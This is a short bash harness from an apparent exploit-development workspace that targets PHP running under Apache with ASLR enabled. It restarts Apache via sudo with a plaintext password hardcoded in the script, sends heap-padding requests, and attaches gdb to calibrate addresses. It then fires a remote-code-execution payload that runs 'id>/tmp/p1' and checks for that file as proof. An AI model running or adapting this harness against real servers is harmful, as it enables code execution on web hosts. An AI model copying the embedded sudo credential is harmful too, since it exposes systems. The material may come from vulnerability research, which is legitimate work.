#!/bin/bash
# ASLR-on trial: fresh normal Apache, A with pads, gdb observes B.
N1=$1; N2=$2; L1=$3; L2=$4; shift 4; PADS="$@"
cd /home/debian/php2shell-work
echo debian.qwe123 | sudo -S bash -c "apache2ctl -k stop 2>/dev/null; sleep 0.6; pkill -9 apache2; sleep 0.6; ulimit -c unlimited; /usr/sbin/apache2ctl -k start; sleep 0.8" >/dev/null 2>&1
echo debian.qwe123 | sudo -S rm -f /tmp/sess_attacksessionid0001 /tmp/g_cal.log /tmp/p1 >/dev/null 2>&1
timeout 40 python3 send_a_pad.py 17 19 3 12 $PADS
sleep 0.4
W=$(pgrep -x apache2 | tail -1)
PER=$(echo debian.qwe123 | sudo -S cat /proc/$W/personality 2>/dev/null)
echo "worker=$W pers=$PER pads=[$PADS]"
echo debian.qwe123 | sudo -S nohup gdb -p $W -batch -x /tmp/g_cal3.gdb >/tmp/gdb_stdout.log 2>&1 &
sleep 7
if [ "$SENDMODE" = "fixed" ]; then
  timeout 20 python3 send_b_rce2.py $N1 $N2 ${HTDATA:-0xdeadbeef} ${SYS:-0xdeadbeef} "id>/tmp/p1" >/dev/null 2>&1
else
  timeout 20 python3 cal_b.py $N1 $N2 $L1 $L2 >/dev/null 2>&1
fi
sleep 4
echo debian.qwe123 | sudo -S grep -E "PSVARS|REF |R0m10|^SCAN 1122|^SCAN dead|^CAND|REF_DESTROY|ARR_DESTROY|SIGSEGV|SIGABRT" /tmp/g_cal.log 2>/dev/null | head -16
sleep 1
echo "--- proof:"; ls -la /tmp/p1 2>&1
